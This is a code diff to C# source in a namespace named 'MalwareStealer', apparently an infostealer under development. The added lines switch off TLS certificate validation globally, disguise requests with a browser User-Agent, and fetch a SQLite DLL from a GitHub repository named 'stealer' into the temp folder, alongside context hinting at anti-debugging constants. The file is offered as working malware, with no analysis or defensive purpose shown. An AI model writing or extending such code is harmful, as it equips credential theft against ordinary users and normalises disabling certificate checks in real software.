@@ -103,9 +103,21 @@ namespace MalwareStealer
         const int EXCEPTION_DEBUG_EVENT = 1;
         const uint EXCEPTION_SINGLE_STEP = 0x80000004;
 
-        // ===== EMBED DLL RESOLVER =====
+        // ===== EMBED DLL RESOLVER (BYPASS SSL) =====
         static void SetupDLLResolver()
         {
+            // BYPASS SSL/TLS ERROR
+            try
+            {
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
+                Console.WriteLine("[+] SSL/TLS bypass enabled.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Failed to bypass SSL: " + ex.Message);
+            }
+
             AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
             {
                 string assemblyName = new AssemblyName(args.Name).Name;
@@ -113,7 +125,6 @@ namespace MalwareStealer
                 {
                     string dllPath = Path.Combine(Path.GetTempPath(), "System.Data.SQLite.dll");
                     
-                    // CEK APAKAH DLL SUDAH ADA
                     if (!File.Exists(dllPath))
                     {
                         try
@@ -121,6 +132,7 @@ namespace MalwareStealer
                             Console.WriteLine("[+] Downloading System.Data.SQLite.dll from GitHub...");
                             using (var client = new WebClient())
                             {
+                                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                 client.DownloadFile("https://raw.githubusercontent.com/dailam008/stealer/main/System.Data.SQLite.dll", dllPath);
                             }
                             Console.WriteLine("[+] Download complete: " + dllPath);
